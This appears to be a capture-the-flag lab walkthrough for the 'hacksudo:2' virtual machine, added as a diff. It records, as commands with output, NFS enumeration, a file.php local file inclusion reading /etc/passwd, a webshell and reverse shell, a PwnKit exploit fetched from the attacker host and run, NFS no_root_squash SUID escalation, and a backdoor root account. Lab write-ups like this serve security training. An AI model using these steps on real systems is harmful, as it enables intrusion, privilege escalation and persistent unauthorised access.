@@ -1,0 +1,314 @@
+
+IP - 10.0.2.21
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/hackdudo2]
+└─# nmap -sC -sV 10.0.2.21 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 17:34 +0630
+Nmap scan report for 10.0.2.21
+Host is up (0.000099s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))
+|_http-title: hacksudo:2
+|_http-server-header: Apache/2.4.46 (Ubuntu)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      36549/tcp   mountd
+|   100005  1,2,3      47299/udp   mountd
+|   100005  1,2,3      47377/tcp6  mountd
+|   100005  1,2,3      59692/udp6  mountd
+|   100021  1,3,4      40497/tcp   nlockmgr
+|   100021  1,3,4      45701/tcp6  nlockmgr
+|   100021  1,3,4      47472/udp   nlockmgr
+|   100021  1,3,4      59547/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 522e9898b9e9c092edacf88cee3c2edc (RSA)
+|   256 6bbb8c90716af9e82a128f0a782b267d (ECDSA)
+|_  256 136845ff32680ce4b51e9baeb633f3be (ED25519)
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+36549/tcp open  mountd   1-3 (RPC #100005)
+40497/tcp open  nlockmgr 1-4 (RPC #100021)
+49189/tcp open  mountd   1-3 (RPC #100005)
+53633/tcp open  mountd   1-3 (RPC #100005)
+MAC Address: 08:00:27:68:34:7A (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Port 2049 Enumeration
+
+┌──(root㉿kali)-[~]
+└─# showmount -e 10.0.2.21                  
+Export list for 10.0.2.21:
+/mnt/nfs *
+
+┌──(root㉿kali)-[~]
+└─# mkdir /tmp/nfs
+
+┌──(root㉿kali)-[~]
+└─# mount -t nfs 10.0.2.21:/mnt/nfs /tmp/nfs -nolock
+
+┌──(root㉿kali)-[/tmp/nfs]
+└─# ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Mar 16  2021 .
+drwxrwxrwt 13 root root 4096 Feb  4 17:39 ..
+-rw-r--r--  1 root root   25 Mar 16  2021 flag1.txt
+
+Got Flag1
+                                                                                                                                                                                            
+┌──(root㉿kali)-[/tmp/nfs]
+└─# cat flag1.txt 
+now root this system !!!
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Dirsearch result
+
+
+┌──(root㉿kali)-[~]
+└─# dirsearch -u http://10.0.2.21/ -e php -f -x 400,403
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+
+Output File: /root/.dirsearch/reports/10.0.2.21/-_23-02-04_17-46-07.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-02-04_17-46-07.log
+
+Target: http://10.0.2.21/
+
+[17:46:07] Starting: 
+[17:46:10] 200 -  484B  - /README.md                                        
+[17:46:16] 200 -    2KB - /audio/                                           
+[17:46:16] 301 -  306B  - /audio  ->  http://10.0.2.21/audio/               
+[17:46:19] 301 -  304B  - /css  ->  http://10.0.2.21/css/                   
+[17:46:19] 200 -  934B  - /css/                                             
+[17:46:22] 200 -  238B  - /file.php                                         
+[17:46:24] 200 -    2KB - /index.html                                       
+[17:46:26] 200 -   79KB - /info.php                                         
+[17:46:27] 301 -  304B  - /lib  ->  http://10.0.2.21/lib/                   
+[17:46:27] 200 -    3KB - /lib/                                             
+[17:46:33] 200 -   12B  - /readme.md                                        
+[17:46:38] 200 -    3KB - /test.html                                        
+[17:46:40] 200 -    1KB - /web/                                             
+                                                                             
+Task Completed
+
+
+I found juicy php webpage that is called /file.php. file.php can be vulnerable to LFI.
+So, I decided to fuzz the parameter:
+
+FUZZ=/etc/passwd
+
+┌──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/hackdudo2]
+└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.21/file.php?FUZZ=/etc/passwd -fs 238
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.21/file.php?FUZZ=/etc/passwd
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 238
+________________________________________________
+
+file                    [Status: 200, Size: 2170, Words: 23, Lines: 44, Duration: 2ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 67 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+
+
+Found "file" parameter is worked.
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin hacksudo:x:1000:1000:hacksudo:/home/hacksudo:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false _rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin 
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Upload webshell from mounted directory
+
+┌──(root㉿kali)-[/tmp/nfs]
+└─# cp ~/Desktop/tools/alfa-shell-v4.1-updated/__welcome.php .
+
+
+
+Boom! I got webshell.
+
+http://10.0.2.21/file.php?file=/mnt/nfs/__welcome.php
+
+but it seems like my webshell didin't work well. So, I upload pentest monkey php reverse shell and run it.
+
+I got reverse shell.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+After Running linpeas.sh priv escalation enumeration I found this machine is vulnerable to PwnKit.
+
+My Machine:
+
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]
+└─# python2 -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...
+10.0.2.21 - - [05/Feb/2023 04:32:12] "GET /PwnKit HTTP/1.1" 200 -
+
+Victim Machine:
+
+www-data@hacksudo:/tmp$ wget http://10.0.2.4:8888/PwnKit
+--2023-02-04 22:02:15--  http://10.0.2.4:8888/PwnKit
+Connecting to 10.0.2.4:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16800 (16K) [application/octet-stream]
+Saving to: ‘PwnKit’
+
+PwnKit              100%[===================>]  16.41K  --.-KB/s    in 0.007s  
+
+2023-02-04 22:02:15 (2.41 MB/s) - ‘PwnKit’ saved [16800/16800]
+
+www-data@hacksudo:/tmp$ chmod +x PwnKit 
+www-data@hacksudo:/tmp$ ./PwnKit 
+root@hacksudo:/tmp# whoami
+root
+
+Root Flag
+
+root@hacksudo:~# cat root.txt 
+rooted!!!
+| |__   __ _  ___| | _____ _   _  __| | ___         ___ ___  _ __ ___  
+| '_ \ / _` |/ __| |/ / __| | | |/ _` |/ _ \       / __/ _ \| '_ ` _ \ 
+| | | | (_| | (__|   <\__ \ |_| | (_| | (_) |  _  | (_| (_) | | | | | |
+|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/  (_)  \___\___/|_| |_| |_|
+www.hacksudo.com
+
+
+
+
+
+Another way of priv escalation
+
+I read /etc/exports for nfs share
+
+www-data@hacksudo:/tmp$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/mnt/nfs       *(rw,no_root_squash)
+
+
+Found no_root_squash
+
+So, we can abuse this nfs share with:
+
+into mounted location /tmp/nfs/
+
+cp /bin/bash .
+
+chmod +s bash
+
+victim machine:
+
+www-data@hacksudo:/mnt/nfs$ ./bash -p
+
+now our kali gcc version is latest version so it didn't work anymore
+
+But we can abusive this nfs with another way
+
+From Victim machine
+
+Step 1:
+
+create new folder "a"
+
+Step 2:
+
+give full permission chmod 777 a
+
+Step 3:
+
+cd a
+
+cp /bin/bash .
+
+From mouted directory from my machine
+
+Step 4:
+
+change ownership
+
+chmod +x bash
+
+Step 5:
+
+chown root:root bash
+
+From Victim Machine
+
+Step 6:
+
+execute
+
+./bash -p
+
+boom! we are root.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
+
+
+
+
